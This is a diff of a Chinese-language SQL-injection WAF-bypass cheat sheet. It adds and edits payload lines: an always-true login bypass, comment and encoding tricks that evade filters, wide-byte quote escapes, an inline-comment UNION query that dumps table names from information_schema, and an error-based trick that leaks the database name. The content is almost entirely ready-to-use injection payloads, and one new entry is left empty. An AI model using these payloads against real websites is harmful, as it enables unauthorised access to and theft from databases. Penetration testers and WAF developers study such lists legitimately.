@@ -178,27 +178,31 @@ WAF is a defender for web.
 - 萬能密鑰繞過  
   - `id=1' or 1 like 1`  
 - 空白繞過  
-  - `select/**/username/**/from/**/users;`
-  - `union select 1,2``` -> ```union(select(1),2)`  
+  - `select/**/username/**/from/**/users;`  
+  - `select@{反引號}id{反引號}`  
+  - `union select 1,2` -> `union(select(1),2)`  
   - `%20 %09 %0a %0b %0c %0d %a0 /**/`  
 - 大小寫繞過  
   - `大小寫混淆 e.g. SelecT`  
 - 雙關鍵字繞過  
   - `UNIunionON`  
-- 內聯注釋繞過(**聽說這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個```*/```去閉合多個```/*!```**)  
+- 內聯注釋繞過(**聽說這招可以繞過很多WAF，用注釋符替換空白以及作結，還可以用單個`*/`去閉合多個`/*!`**)  
   - `id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE*/+/*!TaBlE_ScHeMa*/+like+database()#`  
 - 逗號繞過  
-  - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`   
+  - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
+  - limit逗號 `limit 1 offset 0`  
+  - mid()逗號 `mid(version() from 1 for 1)`
 - 編碼繞過  
   - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
   - `unicode(單引號): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
   - `unicode(空白): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
   - `unicode(左括號): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
-  - `unicode(右括號): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`
+  - `unicode(右括號): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
+  - `Char(49)` `Hex('a')` `Unhex(61)`  
 - 注釋  
   - `#`  行內注釋  
-  - `--+`   後面的加是空白字元  
-  - `/* ... */` 段注釋，可多行  
+  - `--+` `--` `-- -`  
+  - `/* ... */` `///**/`(多個自己變通)段注釋，可多行  
   - {反引號} 特定情況下可作為注釋  mysql <= 5.5  
   - `;` stacking queries 一般php+mysql不可行，但是PDO行得通  
 - 命令繞過  
@@ -208,9 +212,11 @@ WAF is a defender for web.
   - `and/or` -> `&& / |`  
 - 寬字節繞過  
   - 過濾單引號： `%bf%27 %df%27 %aa%27`  
-- `information_schema`等關鍵字被禁掉  
+- `information_schema`被禁掉  
   - 爆庫名：`select * from users where name = helloworld();`  
     原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
+- `union`關鍵字繞過  
+  - ``
     
 更多的思路：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
